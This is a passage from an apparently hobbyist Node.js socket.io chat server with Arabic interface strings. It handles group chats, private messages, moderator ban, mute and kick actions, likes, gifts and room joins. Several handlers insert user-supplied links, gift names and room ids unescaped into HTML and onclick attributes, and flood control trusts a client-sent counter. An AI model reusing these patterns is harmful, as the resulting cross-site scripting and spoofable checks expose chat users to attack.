	         io.to(GroupUsers[rmgr].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "msg",
                        data: {
                        gid: rr["gid"],
                        msg: "تم طرد المستخدم من المحادثه",
                                    us: {
                                    bg: UserInfo[rr["id"]].bg,
                                    id: UserInfo[rr["id"]].id,
                                    idreg: UserInfo[rr["id"]].idreg,
                                    mcol: UserInfo[rr["id"]].mcol,
                                    pic: UserInfo[rr["id"]].pic,
                                    power: UserInfo[rr["id"]].powers,
                                    rep: UserInfo[rr["id"]].rep,
                                    topic: UserInfo[rr["id"]].username,
                                    ucol: UserInfo[rr["id"]].ucol,
                                },
                        }
					}
                });
				};
   };
				
				
				GroupUsers[rmgr].users.splice(rr["id"]);
				};
						
            } else if (data.data["cmd"] == "addUsersJoin") {
             const iadd = JSON.parse(data.data["data"]);
             const idload = GroupUsers.findIndex((x) => x.id == iadd["gid"]);
     if(idload != -1){
       socket.to(iadd["id"]).emit("msg", {
                        cmd: "addGrMsg",
                        data: {
                            cmd: "jogr",
                                grn: GroupUsers[idload].grName,
                                id: iadd["gid"],
                                us: {
                                    bg: UserInfo[socket.id].bg,
                                    id: UserInfo[socket.id].id,
                                    idreg: UserInfo[socket.id].idreg,
                                    mcol: UserInfo[socket.id].mcol,
                                    pic: UserInfo[socket.id].pic,
                                    power: UserInfo[socket.id].powers,
                                    rep: UserInfo[socket.id].rep,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                        },
                    });
	 };
            } else if (data.data["cmd"] == "addGr") {
                var gri = stringGen(10);
                var dd = JSON.parse(data.data["data"]);
                socket.emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "addGr",
                        data: {
                            users: [socket.id],
                            id: gri,
                            adminGrup: socket.id,
                            grName: dd["grName"],
                            pic: UserInfo[socket.id].pic,
                        },
                    },
                });
				
				GroupUsers.push({
                            users: [socket.id],
                            id: gri,
                            adminGrup: socket.id,
                            grName: dd["grName"],
                            pic: UserInfo[socket.id].pic,
                        });

                for (var i = 0; i < dd["users"].length; i++) {
                    io.to(dd["users"][i]).emit("msg", {
                        cmd: "addGrMsg",
                        data: {
                            cmd: "jogr",
                                grn: dd["grName"],
                                id: gri,
                                us: {
                                    bg: UserInfo[socket.id].bg,
                                    id: UserInfo[socket.id].id,
                                    idreg: UserInfo[socket.id].idreg,
                                    mcol: UserInfo[socket.id].mcol,
                                    pic: UserInfo[socket.id].pic,
                                    power: UserInfo[socket.id].powers,
                                    rep: UserInfo[socket.id].rep,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                        },
                    });
                }
		  }else if(data.data['cmd'] == 'jogr'){
           const rmgri = JSON.parse(data.data["data"]);
           const isgm = GroupUsers.findIndex((x) => x.id == rmgri["gid"]);
		   if(isgm != -1){
		   if(rmgri.ty == true){
			   

             GroupUsers[isgm].users.push(rmgri["uid"]);

setTimeout(function(){
    socket.emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "addGr",
                        data: {
                            users: GroupUsers[isgm].users,
                            id: GroupUsers[isgm].id,
                            adminGrup: GroupUsers[isgm].adminGrup,
                            grName: GroupUsers[isgm].grName,
                            pic: GroupUsers[isgm].pic,
                        },
                    },
                });

            for (var i = 0; i < GroupUsers[isgm].users.length; i++) {
				
				
 io.to(GroupUsers[isgm].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                        data: {
                        cmd: "u+",
                            gid: rmgri["gid"],
                            us: rmgri["uid"],
                    }
                });
				
				
              io.to(GroupUsers[isgm].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "msg",
                        data: {
                        gid: rmgri["gid"],
                        msg: "المستخدم قام بالانضمام الى المحادثه الجماعيه",
                                    us: {
                                    bg: UserInfo[socket.id].bg,
                                    id: UserInfo[socket.id].id,
                                    idreg: UserInfo[socket.id].idreg,
                                    mcol: UserInfo[socket.id].mcol,
                                    pic: UserInfo[socket.id].pic,
                                    power: UserInfo[socket.id].powers,
                                    rep: UserInfo[socket.id].rep,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                        }
					}
                });
				
				
           
			}
},1000);
		   }else if(rmgri.ty == false){
   for (var i = 0; i < GroupUsers[isgm].users.length; i++) {
              io.to(GroupUsers[isgm].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "msg",
                        data: {
                        gid: rmgri["gid"],
                        msg: "المستخدم قام برفض الانضمام الى المحادثه الجماعيه",
                                    us: {
                                    bg: UserInfo[socket.id].bg,
                                    id: UserInfo[socket.id].id,
                                    idreg: UserInfo[socket.id].idreg,
                                    mcol: UserInfo[socket.id].mcol,
                                    pic: UserInfo[socket.id].pic,
                                    power: UserInfo[socket.id].powers,
                                    rep: UserInfo[socket.id].rep,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                        }
					}
                });
   }

		   };
		   };
		   
            } else if (data.data["cmd"] == "closeGrupe") {
                socket.emit("msg", { cmd: "addGrMsg", data: { cmd: "clos", data: data.data["data"] } });
            } else if (data.data["cmd"] == "msg") {
                var tt = JSON.parse(data.data["data"]);
				
          const isgma = GroupUsers.findIndex((x) => x.id == tt["gid"]);
		   if(isgma != -1){
         const indexgru = ektisar.findIndex((x) => tt["msg"].includes(x.text1));
            if(indexgru != -1){
	
	            for (var i = 0; i < GroupUsers[isgma].users.length; i++) {
                io.to(GroupUsers[isgma].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "msg",
                        data: {
                            msg: tt["msg"].slice(0, siteweb["walllikes"].lengthMsgPm).replaceAll(ektisar[indexgru].text1,ektisar[indexgru].text2),
                            gid: tt["gid"],
                            us: {
                                bg: UserInfo[socket.id].bg,
                                id: UserInfo[socket.id].id,
                                idreg: UserInfo[socket.id].idreg,
                                mcol: UserInfo[socket.id].mcol,
                                pic: UserInfo[socket.id].pic,
                                power: UserInfo[socket.id].rank,
                                rep: UserInfo[socket.id].rep,
                                topic: UserInfo[socket.id].username,
                                ucol: UserInfo[socket.id].ucol,
                            },
                        },
                    },
                });
				};
			}else{
	            for (var i = 0; i < GroupUsers[isgma].users.length; i++) {
                io.to(GroupUsers[isgma].users[i]).emit("msg", {
                    cmd: "addGrMsg",
                    data: {
                        cmd: "msg",
                        data: {
                            msg: tt["msg"],
                            gid: tt["gid"],
                            us: {
                                bg: UserInfo[socket.id].bg,
                                id: UserInfo[socket.id].id,
                                idreg: UserInfo[socket.id].idreg,
                                mcol: UserInfo[socket.id].mcol,
                                pic: UserInfo[socket.id].pic,
                                power: UserInfo[socket.id].rank,
                                rep: UserInfo[socket.id].rep,
                                topic: UserInfo[socket.id].username,
                                ucol: UserInfo[socket.id].ucol,
                            },
                        },
                    },
                });
				};				
			}
			
			};
            }
        } else if (data.cmd == "pm") {
            if (UserInfo[data.data["id"]].busy == true) {
                socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: "هذا المستخدم قام بإغلاق الخاص",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
            } else {
                if (UserInfo[socket.id].rep >= siteweb["pmlikes"]) {
					
          const indexpm = ektisar.findIndex((x) => data.data.msg.includes(x.text1));
            if(indexpm != -1){
                    io.to(data.data["id"]).emit("msg", {
                        cmd: "pm",
                        data: {
                            topic: UserInfo[socket.id].username,
                            msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgPm).replaceAll(ektisar[indexpm].text1,ektisar[indexpm].text2) || " <a href=" + data.data.link + ' target="_blank"  class="uplink">' + data.data.link + "</a>",
                            pm: socket.id,
                            pic: UserInfo[socket.id].pic,
                            uid: socket.id,
                        },
                    });

                    socket.emit("msg", {
                        cmd: "pm",
                        data: {
                            topic: UserInfo[socket.id].username,
                            msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgPm).replaceAll(ektisar[indexpm].text1,ektisar[indexpm].text2) || " <a href=" + data.data.link + ' target="_blank"  class="uplink">' + data.data.link + "</a>",
                            pm: data.data["id"],
                            pic: UserInfo[socket.id].pic,
                            uid: socket.id,
                        },
                    });   
			}else{
					io.to(data.data["id"]).emit("msg", {
                        cmd: "pm",
                        data: {
                            topic: UserInfo[socket.id].username,
                            msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgPm) || " <a href=" + data.data.link + ' target="_blank"  class="uplink">' + data.data.link + "</a>",
                            pm: socket.id,
                            pic: UserInfo[socket.id].pic,
                            uid: socket.id,
                        },
                    });

                    socket.emit("msg", {
                        cmd: "pm",
                        data: {
                            topic: UserInfo[socket.id].username,
                            msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgPm) || " <a href=" + data.data.link + ' target="_blank"  class="uplink">' + data.data.link + "</a>",
                            pm: data.data["id"],
                            pic: UserInfo[socket.id].pic,
                            uid: socket.id,
                        },
                    });
			}
                } else {
                    socket.emit("msg", {
                        cmd: "not",
                        data: {
                            topic: "",
                            msg: siteweb["pmlikes"] + " " + "عدد الايكات المطلوبة لارسال رسائل خاصه",
                            user: "",
                            force: 0,
                            nonot: true,
                        },
                    });
                }
            }
        } else if (data.cmd == "not") {
        } else if (data.cmd == "action") {
            user_list.findOne({ id: UserInfo[socket.id].uid }, function (err, istoken) {
                if (err) throw err;
                if (istoken) {
                    user_list.findOne({ id: UserInfo[data.data["id"]].uid }, function (err, isid) {
                        if (err) throw err;
                        if (isid) {
                            const ismyid = ispowers.findIndex((x) => x.name == isid.power);
                            const ismytoken = ispowers.findIndex((x) => x.name == istoken.power);
                            if (ispowers[ismytoken].rank > ispowers[ismyid].rank) {
                                if (UserInfo[socket.id] && data.data["cmd"] == "ban") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: "تم حظرك من الدردشة",
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "kicked",
                                        data: {},
                                    });

                                    if (UserInfo[data.data["id"]]) {
                                        io.to(UserInfo[socket.id].idroom).emit("msg", {
                                            cmd: "msg",
                                            data: {
                                                bg: "none",
                                                class: "hmsg",
                                                topic: UserInfo[data.data["id"]].username,
                                                msg: "( هذا المستخدم تم حظره من الدردشة )",
                                                roomid: UserInfo[data.data["id"]].idroom,
                                                pic: UserInfo[data.data["id"]].pic,
                                                uid: data.data["id"],
                                            },
                                        });
                                    }

                                    var save_band = new band_list();
                                    save_band.device_band = UserInfo[data.data["id"]].fp;
                                    save_band.ip_band = UserInfo[data.data["id"]].ip;
                                    save_band.date_band = new Date();
                                    (save_band.name_band = UserInfo[data.data["id"]].username), (save_band.type = "system1");
                                    save_band.date_end = DateMonth;
                                    save_band.save(function (err, save_van) {
                                        if (err) throw err;
                                        if (save_van) {
                                        }
                                    });
                                } else if (UserInfo[data.data["id"]] && data.data["cmd"] == "meiut") {
                                    if (UserInfo[data.data["id"]].ismuted == false) {
                                        io.to(data.data["id"]).emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: UserInfo[socket.id].username,
                                                msg: "تم منعك من الحديث في الدردشة",
                                                user: socket.id,
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                        UserInfo[data.data["id"]].ismuted = true;
                                    } else {
                                        io.to(data.data["id"]).emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: UserInfo[socket.id].username,
                                                msg: "تم السماح لك بالحديث في الدردشة",
                                                user: socket.id,
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                        UserInfo[data.data["id"]].ismuted = false;
                                    }
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "muted",
                                        data: {
                                            id: data.data["id"],
                                            lid: data.data["id"],
                                            ism: UserInfo[data.data["id"]].ismuted,
                                            topic: UserInfo[data.data["id"]].username,
                                        },
                                    });
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "not") {
                                    if (UserInfo[data.data["id"]].alerts == true) {
                                        socket.emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: UserInfo[data.data["id"]].username,
                                                msg: "هذا العضو لا يقبل التنبيهات",
                                                user: socket.id,
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                    } else {
                                        io.to(data.data["id"]).emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: UserInfo[socket.id].username,
                                                msg: data.data["msg"],
                                                user: socket.id,
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                    }
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "kick") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: "تم طردك من الدردشة",
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });

                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "kicked",
                                        data: {},
                                    });

                                    if (UserInfo[data.data["id"]]) {
                                        io.to(UserInfo[socket.id].idroom).emit("msg", {
                                            cmd: "msg",
                                            data: {
                                                bg: "none",
                                                class: "hmsg",
                                                topic: UserInfo[data.data["id"]].username,
                                                msg: "( هذا المستخدم تم طرده من الدردشة )",
                                                roomid: UserInfo[data.data["id"]].idroom,
                                                pic: UserInfo[data.data["id"]].pic,
                                                uid: data.data["id"],
                                            },
                                        });
                                    }

                                    const indedxr1 = roomslists.findIndex((x) => x.id == UserInfo[socket.id].idroom);
                                    savestate({ state: "طرد من الدردشة", topic: UserInfo[socket.id].username, topic1: UserInfo[data.data["id"]].username, room: roomslists[indedxr1].topic, time: new Date().getTime() });
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "like") {
                                    if (data.data["id"] == socket.id) {
                                        socket.emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: "",
                                                msg: "لا يمكنك الإعجاب بنفسك",
                                                user: "",
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                    } else if (UserInfo[socket.id].islike == true) {
                                        socket.emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: "",
                                                msg: "يمكنك اعطاء 1 إعجاب كل 5 دقائق",
                                                user: "",
                                                force: 0,
                                                nonot: true,
                                            },
                                        });
                                    } else {
                                        io.to(data.data["id"]).emit("msg", {
                                            cmd: "not",
                                            data: {
                                                topic: UserInfo[socket.id].username,
                                                msg: "تم الحصول على اعجاب",
                                                user: socket.id,
                                                force: 0,
                                                nonot: true,
                                            },
                                        });

                                        const indexa = online.findIndex((x) => x.id == data.data["id"]);
                                        if (indexa != -1) {
                                            online[indexa].rep += 1;
                                            UserInfo[data.data["id"]].rep += 1;
                                            // io.emit("msg", { cmd: "u^", data: online[indexa] });
                                        }
                                        UserInfo[socket.id].islike = true;
                                        setTimeout(function () {
                                            UserInfo[socket.id].islike = false;
                                        }, 60000 * 5);
                                        if (UserInfo[data.data["id"]].uid) {
                                            var UpdateUser = {
                                                $set: {
                                                    rep: UserInfo[data.data["id"]].rep + 1,
                                                },
                                            };

                                            user_list.updateOne({ id: UserInfo[data.data["id"]].uid }, UpdateUser, function (err, uruser) {
                                                if (err) throw err;
                                                if (uruser) {
                                                }
                                            });
                                        }
                                    }
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "report") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: data.data["msg"],
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "gift") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: "هديه " + "<img src=" + "/dro3/" + data.data["gift"] + ">",
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });
                                    if (UserInfo[data.data["id"]]) {
                                        UserInfo[data.data["id"]].ico = data.data["gift"];
                                        const isd = online.findIndex((x) => x.id == data.data["id"]);
                                        if (isd != -1) {
                                            online[isd].ico = data.data["gift"];
                                            io.emit("msg", { cmd: "u^", data: online[isd] });
                                        }

                                        if (UserInfo[data.data["id"]].uid) {
                                            var uppic = { $set: { ico: data.data["gift"] } };
                                            user_list.updateOne({ id: UserInfo[data.data["id"]].uid }, uppic, function (err, uruser) {
                                                if (err) throw err;
                                                if (uruser) {
                                                    // socket.to(data.data["id"]).emit("savedone", "pic.png");
                                                }
                                            });
                                        }
                                    }
                                } else if (UserInfo[data.data["id"]] && data.data["cmd"] == "uroomleve") {
                                    io.to(UserInfo[data.data["id"]].idroom).emit("msg", {
                                        cmd: "msg",
                                        data: {
                                            bg: "none",
                                            class: "hmsg",
                                            id: UserInfo[data.data["id"]].id,
                                            topic: UserInfo[data.data["id"]].username,
                                            msg:
                                                " هذا المستخدم تم نقله الى غرفة" +
                                                '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
                                                data.data["room"] +
                                                "')\">" +
                                                getname(data.data["room"]) +
                                                "</div>",
                                            roomid: UserInfo[data.data["id"]].idroom,
                                            pic: UserInfo[data.data["id"]].pic,
                                            uid: data.data["id"],
                                        },
                                    });

                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: " تم نقلك الى غرفة " + getname(data.data["room"]),
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });

                                    const indexr1 = roomslists.findIndex((x) => x.id == UserInfo[socket.id].idroom);
                                    savestate({ state: "نقل من الغرفة	", topic: UserInfo[socket.id].username, topic1: UserInfo[data.data["id"]].username, room: roomslists[indexr1].topic, time: new Date().getTime() });

                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "gotorom",
                                        data: {
                                            id: data.data["room"],
                                        },
                                    });
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "op+") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: "تم تغير إعجاباتك الى ↵ 10",
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "delpic") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: "تم حذف صورتك",
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });

                                    if (UserInfo[data.data["id"]]) {
                                        UserInfo[data.data["id"]].pic = "pic.png";

                                        const picdix = online.findIndex((x) => x.id == data.data["id"]);
                                        if (picdix != -1) {
                                            online[picdix].pic = "pic.png";
                                            io.emit("msg", { cmd: "u^", data: online[picdix] });
                                        }

                                        if (UserInfo[data.data["id"]].uid) {
                                            var uppic = { $set: { pic: "pic.png" } };
                                            user_list.updateOne({ id: UserInfo[data.data["id"]].uid }, uppic, function (err, uruser) {
                                                if (err) throw err;
                                                if (uruser) {
                                                    socket.to(data.data["id"]).emit("savedone", "pic.png");
                                                }
                                            });
                                        }
                                    }
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "roomkick") {
                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "not",
                                        data: {
                                            topic: UserInfo[socket.id].username,
                                            msg: "تم طردك من الغرفه",
                                            user: socket.id,
                                            force: 0,
                                            nonot: true,
                                        },
                                    });

                                    UserInfo[data.data["id"]].bandroom.push(UserInfo[data.data["id"]].idroom);

                                    io.to(data.data["id"]).emit("msg", {
                                        cmd: "lavedon",
                                        data: {},
                                    });
                                    if (UserInfo[socket.id]) {
                                        const isdesc1 = roomslists.findIndex((x) => x.id == UserInfo[socket.id].idroom);
                                        savestate({ state: "طرد من الغرفة", topic: UserInfo[socket.id].username, topic1: UserInfo[data.data["id"]].username, room: roomslists[isdesc1].topic, time: new Date().getTime() });
                                    }
                                } else if (UserInfo[socket.id] && data.data["cmd"] == "not") {
                                }
                            } else {
                                socket.emit("savedones", "لا يمكنك التعديل على رتبة اعلى منك");
                            }
                        }
                    });
                }
            });
            //DeleteMessage
        } else if (data.cmd == "delmsg") {
            // data: { bid: 'b6w2tkarnp', topic: 'bnjs' } }
            if (UserInfo[socket.id]) {
                io.to(UserInfo[socket.id].idroom).emit("msg", { cmd: "delmsg", data: { bidR: data.data["bid"], user: true } });
            }
            if (UserInfo[socket.id]) {
                const isdesc = roomslists.findIndex((x) => x.id == UserInfo[socket.id].idroom);
                savestate({ state: "حذف رساله عامة", topic: UserInfo[socket.id].username, topic1: UserInfo[socket.id].username, room: roomslists[isdesc].topic, time: new Date().getTime() });
            }
        } else if (data.cmd == "bc") {
            if (UserInfo[socket.id]) {
                if (UserInfo[socket.id].rep < 544) {
                    socket.emit("msg", {
                        cmd: "not",
                        data: {
                            topic: "",
                            msg: "عدد الايكات المطلوبة للنشر على الحائط 544",
                            user: "",
                            force: 0,
                            nonot: true,
                        },
                    });
                } else {
                    const isidbar = stringGen(10);
                    saves_bar({
                        bg: UserInfo[socket.id].bg,
                        bid: isidbar,
                        force: 1,
                        bcc: [],
                        likes: [],
                        lid: UserInfo[socket.id].lid,
                        uid: UserInfo[socket.id].uid,
                        mcol: UserInfo[socket.id].mcol,
                        pic: UserInfo[socket.id].pic,
                        msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgBc) || " <a href=" + data.data.link + ' target="_blank"  class="uplink">' + data.data.link + "</a>",
                        topic: UserInfo[socket.id].username,
                        ucol: UserInfo[socket.id].ucol,
                    });

                    io.emit("msg", {
                        cmd: "bc",
                        data: {
                            numb: 1,
                            bcc: [],
                            likes: [],
                            bg: UserInfo[socket.id].bg,
                            bid: isidbar,
                            force: 1,
                            lid: UserInfo[socket.id].lid,
                            uid: UserInfo[socket.id].uid,
                            mcol: UserInfo[socket.id].mcol,
                            msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgBc) || " <a href=" + data.data.link + ' target="_blank"  class="uplink">' + data.data.link + "</a>",
                            pic: UserInfo[socket.id].pic,
                            topic: UserInfo[socket.id].username,
                            ucol: UserInfo[socket.id].ucol,
                        },
                    });
                }
            }

            //SendMessage
        } else if (data.cmd == "msg") {
            if (UserInfo[socket.id]) {
                if (UserInfo[socket.id].ismuted == true) {
                    socket.emit("msg", {
                        cmd: "not",
                        data: {
                            topic: "",
                            msg: "أسكات",
                            user: "",
                            force: 0,
                            nonot: true,
                        },
                    });
                } else {
                    if (data.data["cout"] >= 4) {
                        socket.emit("msg", { cmd: "goband", data: socket.id });
                    } else {
                        var idmsg = stringGen(10);

                        const index = ektisar.findIndex((x) => data.data.msg.includes(x.text1));
                        const noletter1 = noletter.findIndex((x) => data.data.msg.includes(x.v));
                        if (noletter1 != -1) {
                            if (noletter[noletter1].path == "wmsgs") {
                                var save_hist = new histroys_noltter();
                                save_hist.ip = UserInfo[socket.id].ip;
                                save_hist.msg = data.data.msg.slice(0, 25);
                                save_hist.topic = UserInfo[socket.id].username;
                                save_hist.v = noletter[noletter1].v;
                                save_hist.save(function (err, save_h) {
                                    if (err) throw err;
                                    if (save_h) {
                                    }
                                });
                            }
                        }

                        const noletter2 = noletter.findIndex((x) => data.data.msg.includes(x.v) && x.path != "wmsgs");
                        // if(UserInfo[socket.id].rep >= siteweb['msgst']){
                        if (index != -1 && noletter2 == -1) {
							if(findWord(ektisar[index].text1,data.data.msg)){
                            io.to(UserInfo[socket.id].idroom).emit("msg", {
                                cmd: "msg",
                                data: {
                                    bg: UserInfo[socket.id].bg,
                                    ico: UserInfo[socket.id].code,
                                    bidR: stringGen(10),
                                    id: UserInfo[socket.id].id,
                                    mcol: UserInfo[socket.id].mcol,
                                    uid: UserInfo[socket.id].id,
                                    msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgRoom).replaceAll(ektisar[index].text1,ektisar[index].text2),
                                    pic: UserInfo[socket.id].pic,
                                    roomid: UserInfo[socket.id].idroom,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                            });
						}else{
							    io.to(UserInfo[socket.id].idroom).emit("msg", {
                                cmd: "msg",
                                data: {
                                    bg: UserInfo[socket.id].bg,
                                    ico: UserInfo[socket.id].code,
                                    bidR: stringGen(10),
                                    id: UserInfo[socket.id].id,
                                    mcol: UserInfo[socket.id].mcol,
                                    uid: UserInfo[socket.id].id,
                                    msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgRoom),
                                    pic: UserInfo[socket.id].pic,
                                    roomid: UserInfo[socket.id].idroom,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                            });
						};
                        } else if (noletter2 == -1) {
                            io.to(UserInfo[socket.id].idroom).emit("msg", {
                                cmd: "msg",
                                data: {
                                    bg: UserInfo[socket.id].bg,
                                    ico: UserInfo[socket.id].code,
                                    bidR: stringGen(10),
                                    id: UserInfo[socket.id].id,
                                    mcol: UserInfo[socket.id].mcol,
                                    uid: UserInfo[socket.id].id,
                                    msg: data.data.msg.slice(0, siteweb["walllikes"].lengthMsgRoom),
                                    pic: UserInfo[socket.id].pic,
                                    roomid: UserInfo[socket.id].idroom,
                                    topic: UserInfo[socket.id].username,
                                    ucol: UserInfo[socket.id].ucol,
                                },
                            });
                        }
                    }
                }
                /*          }else{
     socket.emit("msg", {
                    cmd: "not",
                    data: {
                        topic: "",
                        msg: siteweb['msgst']+' '+"الايكات المطلوبه لإرسال رسائل عامة",
                        user: "",
                        force: 0,
                        nonot: true,
                    },
                });
			};*/
            }
            //LeavedRoom
        } else if (data.cmd == "rleave") {
            if (UserInfo[socket.id]) {
                if (UserInfo[socket.id].powers["stealth"] == 1 && UserInfo[socket.id].stealth == true) {
                } else {
                    io.to(UserInfo[socket.id].idroom).emit("msg", {
                        cmd: "msg",
                        data: {
                            bg: "none",
                            class: "hmsg",
                            topic: UserInfo[socket.id].username,
                            msg: "( هذا المستخدم غادر الغرفه )",
                            roomid: UserInfo[socket.id].idroom,
                            pic: UserInfo[socket.id].pic,
                        },
                    });
                }

                socket.leave(UserInfo[socket.id].idroom);
                UserInfo[socket.id].idroom = null;

                // setTimeout(function(){
                io.emit("msg", { cmd: "ur", data: [socket.id, null] });
                // },1000);
            }

            //RejoinRoom
        } else if (data.cmd == "pmsg") {

	      const indexektisar = ektisar.findIndex((x) => data.data.msg.includes(x.text1));
            if(indexektisar != -1 && findWord(ektisar[indexektisar].text1,data.data.msg)){
            io.emit("msg", {
                cmd: "pmsg",
                data: {
                    bg: UserInfo[socket.id].bg,
                    class: "pmsgc",
                    topic: UserInfo[socket.id].username,
                    msg: data.data.msg.slice(0, 255).replaceAll(ektisar[indexektisar].text1,ektisar[indexektisar].text2),
                    roomid: UserInfo[socket.id].idroom,
                    ucol: UserInfo[socket.id].ucol,
                    bidR: "m3iZLYBFzS",
                    force: 1,
                    pic: "room.png",
                    uid: UserInfo[socket.id].uid,
                },
            });
			}else{
  io.emit("msg", {
                cmd: "pmsg",
                data: {
                    bg: UserInfo[socket.id].bg,
                    class: "pmsgc",
                    topic: UserInfo[socket.id].username,
                    msg: data.data.msg.slice(0, 250),
                    roomid: UserInfo[socket.id].idroom,
                    ucol: UserInfo[socket.id].ucol,
                    bidR: "m3iZLYBFzS",
                    force: 1,
                    pic: "room.png",
                    uid: UserInfo[socket.id].uid,
                },
            });
			}
        } else if (data.cmd == "rjoin") {
            if (UserInfo[socket.id]) {
                const iskicklist = UserInfo[socket.id].bandroom.findIndex((x) => x == data.data["id"]);
                if (iskicklist != -1) {
                    socket.emit("msg", {
                        cmd: "not",
                        data: {
                            topic: "",
                            msg: "تم حظرك من الغرفة مؤقتا",
                            user: "",
                            force: 0,
                            nonot: true,
                        },
                    });
                } else {
                    if (data.data["cout"] >= 4) {
                        socket.emit("msg", { cmd: "goband", data: socket.id });
                    } else {
                        const indexispass = roomslists.findIndex((x) => x.id == data.data["id"]);
                        const index = roomslists.findIndex((x) => x.id == data.data["id"]);
                        if (roomslists[indexispass].pass == data.data["pwd"] || roomslists[indexispass].needpass == false) {
                            if (data.data["id"] != UserInfo[socket.id].idroom) {
								
								
  socket.to(UserInfo[socket.id].idroom).broadcast.emit("msg", {
                                            cmd: "msg",
                                            data: {
                                                bg: "none",
                                                class: "pmsgc",
                                                id: UserInfo[socket.id].id,
                                                topic: UserInfo[socket.id].username,
                                                msg:
                                                    "هذا المستخدم انتقل الى الغرفة" +
                                                    '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
                                                    roomslists[index].id +
                                                    "')\">" +
                                                    roomslists[index].topic +
                                                    "</div>",
                                                roomid: data.data["id"],
                                                pic: UserInfo[socket.id].pic,
                                                uid: socket.id,
                                            },
                                        });
										
                                socket.leave(UserInfo[socket.id].idroom);
                                socket.join(data.data["id"]);
                                UserInfo[socket.id].idroom = data.data["id"];

                                const picdiax = online.findIndex((x) => x.id == socket.id);
                                if (picdiax != -1) {
                                    online[picdiax].idroom = data.data["id"];
                                    io.emit("msg", { cmd: "u^", data: online[picdiax] });
                                }

                                // setTimeout(function(){
                                io.emit("msg", { cmd: "ur", data: [socket.id, data.data["id"]] });
                                // },1500);
                                if (UserInfo[socket.id]) {
                                    if (UserInfo[socket.id].powers["stealth"] == 1 && UserInfo[socket.id].stealth == true) {
                                    } else {
                                        io.to(data.data["id"]).emit("msg", {
                                            cmd: "msg",
                                            data: {
                                                bg: "none",
                                                class: "hmsg",
                                                id: UserInfo[socket.id].id,
                                                topic: UserInfo[socket.id].username,
                                                msg:
